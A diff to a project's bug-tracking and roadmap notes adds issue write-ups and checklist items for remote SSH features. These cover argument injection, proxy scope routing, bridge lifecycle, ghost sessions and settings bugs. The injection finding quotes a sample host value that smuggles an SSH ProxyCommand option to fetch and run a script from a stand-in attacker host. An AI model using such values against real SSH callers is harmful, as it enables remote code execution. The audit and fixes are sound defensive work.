@@ -9,6 +9,175 @@ The earlier command-card UX issue where `OUT` could render as an empty dark bloc
 Command messages now use a compact `IN` / `OUT` layout with copy controls, a collapsible output
 view for longer results, and a plain placeholder when there is no command output.
 
+## SSH argument injection via remote host field
+
+**Severity:** High - crafted host values can execute arbitrary commands through the SSH binary.
+
+`remote_ssh_target()` constructs the SSH target as `user@host` and passes it as a positional arg
+to `Command::new("ssh")` without a `--` separator. A crafted `host` like `-oProxyCommand=curl
+attacker.com/x|sh` would be interpreted by SSH as an option rather than a hostname, enabling
+arbitrary command execution. While `Command::arg()` does not invoke a shell, the SSH binary itself
+interprets arguments starting with `-` as options.
+
+**Current impact:**
+- A user (or future API caller) who sets a remote host to `-oProxyCommand=...` can execute
+  arbitrary commands when any operation triggers SSH connection
+- `normalize_remote_configs` only checks that host is non-empty after trimming — no character-class
+  validation
+
+**Affected code (src/remote.rs, src/state.rs):**
+- `remote_ssh_target()` — constructs the target string
+- `RemoteConnection::start_process()` — builds the SSH command without `--` before positional args
+- `normalize_remote_configs()` — input validation layer that should reject hostile values
+
+**Fix:**
+- Add `command.arg("--")` before the target argument in `start_process()` so SSH treats everything
+  after it as positional
+- Validate that `host` does not start with `-` and matches a hostname/IP pattern
+- Validate that `user` does not contain `@` and matches `[a-zA-Z0-9._-]+`
+- Validate that `id` only contains safe characters
+
+## put_review proxy sends scope in body instead of query params
+
+**Severity:** High - remote review saves silently lose session/project context.
+
+When `put_review` is proxied to a remote, `remote_put_json` injects the session/project scope into
+the JSON body via `apply_remote_scope_to_body`. However, the remote `put_review` handler extracts
+scope from query parameters (`Query<ReviewQuery>`), not from the body. The scope fields are
+silently ignored by the remote server.
+
+**Current impact:**
+- Remote review saves lose session/project scoping
+- The review may be saved without proper storage root resolution on the remote
+- The bug is silent — the request succeeds but uses wrong or missing scope
+
+**Affected code (src/remote.rs, src/api.rs):**
+- `remote_put_json()` — only supports body injection, no query params
+- `apply_remote_scope_to_body()` — injects scope into JSON body
+- `put_review` handler in api.rs — reads scope from `Query<ReviewQuery>`
+
+**Fix:**
+- Add query parameter support to `remote_put_json` (like `remote_get_json` already has)
+- Pass scope as query params instead of embedding in the body for `put_review`
+
+## Removing a remote does not stop its background bridge loop
+
+**Severity:** High - deleted remotes can keep reconnecting forever and duplicate future event consumers.
+
+Project-scoped remotes now start a long-lived SSE bridge thread per remote, but removing a remote
+from preferences only drops it from the registry map. The worker started by
+`RemoteConnection::start_event_bridge()` keeps running because it has no shutdown signal and the
+`event_bridge_started` guard is never reset.
+
+**Current impact:**
+- Removing a remote does not actually stop its background reconnect loop
+- Re-adding the same remote can create a second bridge worker for the same id
+- Duplicate workers can apply the same remote state or delta more than once
+
+**Affected code (`src/remote.rs`):**
+- `RemoteRegistry::reconcile()`
+- `RemoteConnection::start_event_bridge()`
+
+**Fix:**
+- Add an explicit shutdown signal for each remote bridge worker
+- Exit the loop when the remote is removed, not just when it is disabled
+- Reset the started guard when the worker terminates so a future restart is clean
+
+## Remote snapshot sync leaves ghost sessions behind
+
+**Severity:** High - the UI can keep dead proxy sessions after the remote has already removed them.
+
+Remote session sync currently updates proxy sessions that still appear in a remote snapshot, but it
+never removes proxy sessions that disappeared remotely. If a remote session is killed outside the
+local control plane or lost during reconnect, the local state keeps a stale proxy record with the
+old `remote_session_id`.
+
+**Current impact:**
+- Killed remote sessions can remain visible locally as ghost tabs/cards
+- Later actions target a remote session id that no longer exists
+- The local state can drift permanently until the user manually cleans it up
+
+**Affected code (`src/remote.rs`):**
+- `apply_remote_state_snapshot()`
+- `sync_remote_state_inner()`
+
+**Fix:**
+- Remove remote proxy sessions whose `remote_session_id` is absent from the latest snapshot for
+  that remote
+- Add a regression test covering remote-side session deletion and reconnect resync
+
+## Remote settings drafts can be overwritten by normal state updates
+
+**Severity:** Medium
+
+The new Remotes settings panel keeps a local draft copy of the remote list, but
+`syncPreferencesFromState()` rebuilds `remoteConfigs` from every adopted backend state. During
+normal streaming or any unrelated settings update, `RemotePreferencesPanel` sees a new `remotes`
+prop and resets its draft state.
+
+**Current impact:**
+- Unsaved edits in the Remotes settings tab can disappear while sessions are streaming
+- Users can lose in-progress remote config changes without touching the Remotes panel controls
+- The issue is hard to notice in testing unless the app is receiving live updates
+
+**Affected code (`ui/src/App.tsx`):**
+- `syncPreferencesFromState()`
+- `RemotePreferencesPanel`
+
+**Fix:**
+- Avoid resetting the draft state when the remote config value is semantically unchanged
+- Keep the local draft isolated from unrelated state adoption paths
+- Add a frontend regression test for unsaved edits surviving a normal SSE/state refresh
+
+## Create session is still workspace-first even though remote routing is project-scoped
+
+**Severity:** Medium
+
+The project-scoped remote model assumes session routing comes from the selected project, but the
+create-session dialog still offers `Current workspace` / `Default workspace`. That path can submit
+a remote session's workdir as if it were a local filesystem path, which then fails local directory
+validation instead of routing remotely.
+
+**Current impact:**
+- Remote users can still pick a workspace-only create-session path that is no longer valid
+- A remote current-workspace path can be sent into local workdir validation and fail with a
+  confusing error
+- The dialog renders a `createSessionProjectSelectionError` slot, but it is currently always `null`
+
+**Affected code (`ui/src/App.tsx`, `src/state.rs`, `src/api.rs`):**
+- create-session project selection and submission flow in `App.tsx`
+- fallback project/workdir inference in `AppState::create_session()`
+- `resolve_session_workdir()` local path validation
+
+**Fix:**
+- Make create-session fully project-first for remote-capable routing
+- Remove or block the workspace-only path when the current context is remote
+- Surface a real selection error instead of leaving the placeholder state unused
+
+## Remote disable semantics do not match the UI copy
+
+**Severity:** Low
+
+The UI presents a remote toggle labeled `Enabled for new projects`, but the backend rejects all use
+of a disabled remote, including access through existing projects and sessions. The product copy
+implies a narrower effect than the backend actually enforces.
+
+**Current impact:**
+- Users can disable a remote expecting only creation to be blocked
+- Existing remote projects can become unexpectedly unusable
+- The settings surface understates the real impact of the toggle
+
+**Affected code (`ui/src/App.tsx`, `src/state.rs`, `src/remote.rs`):**
+- remote settings toggle label in `RemotePreferencesPanel`
+- backend remote validation in `create_project()`
+- backend remote access validation in `validate_remote_connection_config()`
+
+**Fix:**
+- Either rename the setting to communicate that it disables the remote globally
+- Or change backend behavior so disabled remotes are hidden from new-project flows but still usable
+  for existing bound projects
+- Add tests for the chosen semantics so the UI copy and backend behavior stay aligned
+
 ## Shared Codex subagent ordering is not turn-scoped
 
 **Severity:** High - hidden review trace messages can be inserted into the wrong part of the conversation.
@@ -255,6 +424,7 @@ noise.
 ---
 ## Feature briefs
 
+- [Project-Scoped Remotes](./features/project-scoped-remotes.md)
 - [Session Model Switching](./features/model-switching.md)
 - [Slash Commands](./features/slash-commands.md)
 - [Gemini CLI Integration](./features/gemini-cli-integration.md)
@@ -491,6 +661,18 @@ Concrete work implied by the current TermAl parity gaps. Ordered by user impact 
 
 ## P0
 
+- [ ] Fix SSH argument injection in remote host field:
+  add `--` before the SSH target argument in `start_process()`, validate host/user/id fields
+  against character allowlists in `normalize_remote_configs()`.
+- [ ] Fix put_review proxy scope routing:
+  pass session/project scope as query params instead of embedding in the body, matching how the
+  remote handler reads scope from `Query<ReviewQuery>`.
+- [ ] Fix remote bridge lifecycle:
+  removing a remote must stop its background bridge worker, and restarting the same remote must not
+  create duplicate SSE consumers.
+- [ ] Reconcile remote snapshot deletions:
+  when a remote session disappears from the latest snapshot, remove the matching local proxy
+  session instead of leaving a ghost record behind.
 - [ ] Lock down `/api/file`:
   resolve relative paths against the requesting session's `workdir`, reject reads outside allowed
   roots, and stop treating arbitrary absolute paths as valid source-view targets.
@@ -523,6 +705,14 @@ Concrete work implied by the current TermAl parity gaps. Ordered by user impact 
 
 ## P1
 
+- [ ] Make create-session fully project-first for remote routing:
+  remove or block the `Current workspace` / `Default workspace` path when it cannot be mapped to a
+  concrete project owner, and surface a clear validation error in the dialog.
+- [ ] Preserve unsaved Remotes settings drafts during live state updates:
+  normal SSE or state refreshes should not wipe in-progress edits in the settings panel.
+- [ ] Align disabled remote semantics:
+  either treat the toggle as a global disable everywhere or narrow backend behavior so the UI label
+  `Enabled for new projects` is truthful.
 - [ ] Add native slash command discovery:
   keep the existing session-control slash palette, but also parse and expose
   native agent commands such as Claude's `commands` metadata so TermAl can offer
@@ -588,3 +778,4 @@ Concrete work implied by the current TermAl parity gaps. Ordered by user impact 
   integration surfaces.
 
 ## Later
+
